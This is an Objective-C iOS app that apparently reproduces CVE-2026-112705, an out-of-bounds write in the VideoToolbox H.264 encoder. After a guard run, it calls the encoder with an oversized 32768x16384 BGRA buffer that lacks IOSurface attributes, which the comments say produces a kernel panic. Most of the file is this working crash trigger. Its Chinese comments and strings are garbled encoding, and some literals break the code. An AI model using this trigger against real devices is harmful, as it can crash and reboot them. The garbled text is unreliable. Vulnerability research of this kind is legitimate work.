//
//  vt112705.m 鈥?澶嶇幇 CVE-2026-112705锛圓VEVideoEncoder OOB write锛?//
//  鏉ユ簮锛歡ithub.com/Lak453/CVE-2026-112705-poc
//  璇ヤ粨搴撶敤**绾?VT 鍏紑 API** 澶嶇幇锛宨Phone18,4 / iOS 26.0 瀹炴祴 2/2 娆?kernel panic锛?//     panic signature: "dart-ave" PTE-invalid write fault
//
//  瑙﹀彂鍙傛暟锛堢収鎶勶級锛?//    codec  = H.264锛堜笉鏄?HEVC锛侊級
//    W 脳 H  = 32768 脳 16384     = 2^29锛堜綆浜?AVD 鐨?2^30 涓婇檺锛屼篃閮藉湪 65535 鍐咃級
//    buffer = BGRA锛?*without IOSurface attributes**锛坅ttributes = NULL锛?//    buffer 鐪熷疄鍒嗛厤 = 32768脳16384脳4 = 2 GB锛坕Phone 6GB RAM 鍙垎閰嶏級
//
//  guard锛堥鏈熸甯革級锛?//    16384 脳 16384 = 2^28锛屽悓鍙傛暟
//
//  涓轰粈涔堜箣鍓?vtframe 娌℃墦鍒帮細
//    鈶?鎴戠敤鐨?H = 131072/131073/262160 鍏ㄩ儴 > 65535锛圚.264/HEVC 鐨?SPS 楂樺害鏄?u16锛?//    鈶?鎴戠敤 64脳64 灏?buffer 閰嶅ぇ澹版槑 鈫?VT 妫€娴嬪埌涓嶅尮閰嶅氨闈欓粯璺宠繃锛坰yslog 鏃?Resolution:锛?//    鈬?杩欐涓よ€呴兘鍚堟硶銆乥uffer 涔熷尮閰嶏紝鎵嶄細鐪熺殑缂栫爜
//
//  鈽?棰勬湡缁撴灉锛歡uard 姝ｅ父 鈫?trigger 瑙﹀彂 kernel panic 鈫?璁惧閲嶅惎
//    宕╀簡涔嬪悗鐪?crash 鏃ュ織鏈夋病鏈?"dart-ave" / "AVE" / PTE 瀛楁牱锛岄偅灏辨槸纭瘉銆?//

#import <UIKit/UIKit.h>
#import <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <unistd.h>

static NSMutableString *gLog = nil;
static UITextView    *gView = nil;
static UILabel       *gStatus = nil;
static dispatch_queue_t gQ = nil;

static void L(NSString *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"VT112705 %@", s);
    NSString *line = [s stringByAppendingString:@"\n"];
    NSString *p = [NSTemporaryDirectory() stringByAppendingPathComponent:@"vt112705.log"];
    FILE *f = fopen([p UTF8String], "a");
    if (f) { fprintf(f, "%s", [line UTF8String]); fclose(f); }
    // 鍚屾钀藉睆锛歱anic 鍓嶄繚璇佽兘鐪嬪埌
    dispatch_sync(dispatch_get_main_queue(), ^{
        [gLog appendString:line];
        if (gView) { gView.text = gLog; [gView scrollRangeToVisible:NSMakeRange(gLog.length,0)]; }
    });
}

static void SetStatus(NSString *s)
{
    dispatch_async(dispatch_get_main_queue(), ^{
        if (gStatus) {
            gStatus.text = s;
            gStatus.font = [UIFont monospacedSystemFontOfSize:13 weight:UIFontWeightBold];
        }
    });
}

// ---- 绫诲瀷锛堝鐢?vtframe 鐨勫仛娉曪紝閬垮厤涓?SDK 鍐茬獊锛?---
typedef void *VTCompressionSessionRef;
typedef struct { int64_t value; int32_t timescale; uint32_t flags; int64_t epoch; } CMTime;

static const uint32_t kCMVideoCodecType_H264 = 0x61766331;   // 'avc1'
// 'BGRA' 鐢ㄥ瓧闈㈠€硷紝閬垮厤涓?SDK 鐨?kCVPixelFormatType_32BGRA 鍐茬獊
static const uint32_t kPixFmt_BGRA = 0x42475241;

typedef int32_t (*fn_create_t)(void *, int32_t, int32_t, uint32_t,
                               void *, void *, void *, void *, void *, VTCompressionSessionRef *);
typedef int32_t (*fn_prepare_t)(VTCompressionSessionRef);
typedef int32_t (*fn_encode_t)(VTCompressionSessionRef, CVPixelBufferRef, CMTime, CMTime,
                               void *, void *, void *);
typedef void    (*fn_inv_t)(VTCompressionSessionRef);
typedef int32_t (*fn_pb_create_t)(void *, size_t, size_t, uint32_t, void *, CVPixelBufferRef *);
typedef void    (*fn_pb_release_t)(CVPixelBufferRef);

static fn_create_t     p_create  = NULL;
static fn_prepare_t    p_prepare = NULL;
static fn_encode_t     p_encode  = NULL;
static fn_inv_t        p_inv     = NULL;
static fn_pb_create_t  p_pbnew   = NULL;
static fn_pb_release_t p_pbfree  = NULL;

static const char *st_name(int32_t st)
{
    switch (st) {
        case 0:      return "noErr";
        case -12902: return "kVTParameterErr";
        case -12903: return "kVTInvalidSessionErr";
        case -12904: return "kVTAllocationFailedErr";
        case -12906: return "kVTDecompressionFailedErr";
        case -12908: return "kVTNotSupportedErr";
        case -6660:  return "kCVReturnInvalidArgument";
        case -6661:  return "kCVReturnInvalidSize";
        case -6662:  return "kCVReturnAllocationFailed";
        case -50:    return "paramErr";
        case -108:   return "memFullErr";
        default:     return "?";
    }
}

static CMTime T_zero(void) { CMTime t = {0,0,0,0}; return t; }

// 涓€娆″畬鏁村皾璇曪細Create 鈫?PixelBuffer 鈫?Prepare 鈫?EncodeFrame
static void attempt(const char *tag, int32_t W, int32_t H)
{
    int64_t bytes = (int64_t)W * (int64_t)H * 4;
    L(@"");
    L(@"========== %@: %d x %d ==========", @(tag), W, H);
    L(@"    W*H = %lld (%.3f x 2^30)   buffer = %.2f GB",
      (long long)((int64_t)W*(int64_t)H),
      (double)((int64_t)W*(int64_t)H)/1073741824.0,
      (double)bytes/1073741824.0);
    SetStatus([NSString stringWithFormat:@"%@ %dx%d", @(tag), W, H]);

    // 1) Create
    VTCompressionSessionRef s = NULL;
    L(@"  [1] VTCompressionSessionCreate (H.264) ...");
    int32_t st = p_create(NULL, W, H, kCMVideoCodecType_H264,
                          NULL, NULL, NULL, NULL, NULL, &s);
    L(@"      -> %d %s  session=%p", st, st_name(st), s);
    if (st != 0 || !s) { L(@"      Create 澶辫触锛屼腑姝㈡湰娆?); return; }

    // 2) PixelBuffer锛圔GRA锛?*鏃?IOSurface 灞炴€?* = attributes NULL锛?    CVPixelBufferRef pb = NULL;
    L(@"  [2] CVPixelBufferCreate %dx%d BGRA (attributes=NULL锛屾棤 IOSurface) ...", W, H);
    L(@"      棰勮鍒嗛厤 %.2f GB ...", (double)bytes/1073741824.0);
    st = p_pbnew(NULL, W, H, kPixFmt_BGRA, NULL, &pb);
    L(@"      -> %d %s  pb=%p", st, st_name(st), pb);
    if (st != 0 || !pb) {
        L(@"      buffer 鍒嗛厤澶辫触锛堝彲鑳藉唴瀛樹笉澶燂級锛屼腑姝㈡湰娆?);
        p_inv(s); CFRelease((CFTypeRef)s);
        return;
    }

    // 3) Prepare
    L(@"  [3] VTCompressionSessionPrepareToEncodeFrames ...");
    st = p_prepare(s);
    L(@"      -> %d %s", st, st_name(st));

    // 4) EncodeFrame 鈽?瑙﹀彂
    L(@"  [4] VTCompressionSessionEncodeFrame ...  鈫?鈽呪槄鈽?瑙﹀彂琛?);
    L(@"      濡傛灉 AVE2 鐪熺殑鎸夎繖涓昂瀵哥畻 buffer 涓旀孩鍑猴紝杩欓噷浼?panic");
    CMTime z = T_zero();
    st = p_encode(s, pb, z, z, NULL, NULL, NULL);
    L(@"      -> %d %s", st, st_name(st));

    L(@"  [5] 娓呯悊 ...");
    p_pbfree(pb);
    p_inv(s);
    CFRelease((CFTypeRef)s);
    L(@"      鏈瀹屾垚锛屾病鏈夊穿婧?);
}

static void run(void)
{
    L(@"===== CVE-2026-112705 澶嶇幇 =====");
    L(@"uid=%d pid=%d", getuid(), getpid());
    L(@"鍙傛暟鏉ユ簮: github.com/Lak453/CVE-2026-112705-poc");
    L(@"  guard   16384x16384  棰勬湡姝ｅ父");
    L(@"  trigger 32768x16384  棰勬湡 kernel panic锛坉art-ave PTE-invalid write锛?);
    L(@"");

    void *vt = dlopen("/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox", RTLD_NOW);
    void *cv = dlopen("/System/Library/Frameworks/CoreVideo.framework/CoreVideo", RTLD_NOW);
    L(@"[dlopen] VT=%p CV=%p", vt, cv);
    if (!vt || !cv) { L(@"鍔犺浇澶辫触"); SetStatus(@"鍔犺浇澶辫触"); return; }

    p_create  = (fn_create_t)dlsym(vt, "VTCompressionSessionCreate");
    p_prepare = (fn_prepare_t)dlsym(vt, "VTCompressionSessionPrepareToEncodeFrames");
    p_encode  = (fn_encode_t)dlsym(vt, "VTCompressionSessionEncodeFrame");
    p_inv     = (fn_inv_t)dlsym(vt, "VTCompressionSessionInvalidate");
    p_pbnew   = (fn_pb_create_t)dlsym(cv, "CVPixelBufferCreate");
    p_pbfree  = (fn_pb_release_t)dlsym(cv, "CVPixelBufferRelease");
    L(@"[dlsym] create=%p prepare=%p encode=%p pbnew=%p",
      p_create, p_prepare, p_encode, p_pbnew);
    if (!p_create || !p_prepare || !p_encode || !p_pbnew) {
        L(@"dlsym 澶辫触"); SetStatus(@"dlsym 澶辫触"); return;
    }

    // ---- Step 1: guard锛堥鏈熸甯革紝纭璺緞鍙敤锛?---
    attempt("GUARD", 16384, 16384);
    sleep(3);

    // ---- Step 2: trigger锛堥鏈?panic锛?---
    attempt("TRIGGER", 32768, 16384);

    L(@"");
    L(@"===== 涓ゆ閮借窇瀹屼簡锛屾病鏈夊穿婧?=====");
    L(@"  鈬?18.7.2 涓婅繖涓?bug 鍙兘宸茶淇紙112705 淇簬 26.7锛?);
    L(@"  鈬?鎴栬€?iPhone13,4/A14 鐨勮兘鍔涜〃鎷掔粷浜嗚繖缁勫昂瀵?);
    L(@"  鈬?涓嬩竴姝ワ細璋?16384x16385 / 24576x16384 绛変腑闂村昂瀵告壘杈圭晫");
    SetStatus(@"瀹屾垚锛岀湅鏃ュ織");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    if (!gLog) gLog = [NSMutableString new];
    if (!gQ) gQ = dispatch_queue_create("vt112705.log", DISPATCH_QUEUE_SERIAL);

    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];

    CGFloat h = self.window.bounds.size.height;
    gStatus = [[UILabel alloc] initWithFrame:CGRectMake(8, 52, self.window.bounds.size.width - 16, 34)];
    gStatus.textAlignment = NSTextAlignmentCenter;
    gStatus.text = @"vt112705...";
    gStatus.textColor = [UIColor colorWithRed:1 green:0.4 blue:0.4 alpha:1];
    gStatus.font = [UIFont monospacedSystemFontOfSize:13 weight:UIFontWeightBold];
    [vc.view addSubview:gStatus];

    gView = [[UITextView alloc] initWithFrame:CGRectMake(0, 90, self.window.bounds.size.width, h - 90)];
    gView.backgroundColor = [UIColor blackColor];
    gView.textColor = [UIColor greenColor];
    gView.font = [UIFont fontWithName:@"Menlo" size:9] ?: [UIFont systemFontOfSize:9];
    gView.editable = NO;
    [vc.view addSubview:gView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        @autoreleasepool { run(); }
    });
    return YES;
}
@end

int main(int argc, char *argv[])
{
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
